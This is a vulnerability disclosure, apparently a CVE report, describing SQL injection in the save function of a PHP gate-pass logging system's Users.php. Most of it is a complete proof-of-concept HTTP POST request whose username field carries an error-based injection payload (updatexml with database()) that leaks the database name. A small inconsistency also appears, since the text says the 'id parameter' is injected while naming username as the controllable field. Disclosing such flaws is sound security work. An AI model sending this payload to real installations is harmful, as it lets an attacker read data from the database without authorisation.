## Affected version: 
Employee and Visitor Gate Pass Logging System - 1.0

## Vendor:
https://www.sourcecodester.com/users/tips23

## Software:
https://www.sourcecodester.com/php/15026/employee-and-visitor-gate-pass-logging-system-php-source-code.html

## Vulnerability File:
/employee_gatepass/classes/Users.php?f=save

## Description:
Employee and Visitor Gate Pass Logging System 1.0 is vulnerable to unrestricted SQL injection attacks via /employee_gatepass/classes/Users.php?f=save, the controllable parameter is: username. This function brings the id parameter into the SQL statement for execution without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

Status: CRITICAL

POC
```
POST /employee_gatepass/classes/Users.php?f=save HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------34473676497087836224095229176
Content-Length: 864
Origin: http://localhost
Connection: close
Referer: http://localhost/employee_gatepass/admin/?page=user
Cookie: PHPSESSID=q643apn08ggv5g81r5q8pocl6t
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Forwarded-For: 192.168.1.23

-----------------------------34473676497087836224095229176
Content-Disposition: form-data; name="id"

1
-----------------------------34473676497087836224095229176
Content-Disposition: form-data; name="firstname"

Adminstrator
-----------------------------34473676497087836224095229176
Content-Disposition: form-data; name="lastname"

Admin
-----------------------------34473676497087836224095229176
Content-Disposition: form-data; name="username"

admin' and updatexml(1,concat(0x7e,(database())),3)-- q
-----------------------------34473676497087836224095229176
Content-Disposition: form-data; name="password"

admin123
-----------------------------34473676497087836224095229176
Content-Disposition: form-data; name="img"; filename=""
Content-Type: application/octet-stream


-----------------------------34473676497087836224095229176--
```
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/ebcfc5ae-0bfe-4a36-98d2-1e5a8e95d35d)

Get the database name: employee_gatepass_db
## code analysis:

The username parameter in Users.php is controllable and directly brought into the SQL statement for execution, causing SQL injection.
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/5dd0943a-c70c-4e5f-891e-c38dccd6eb4c)



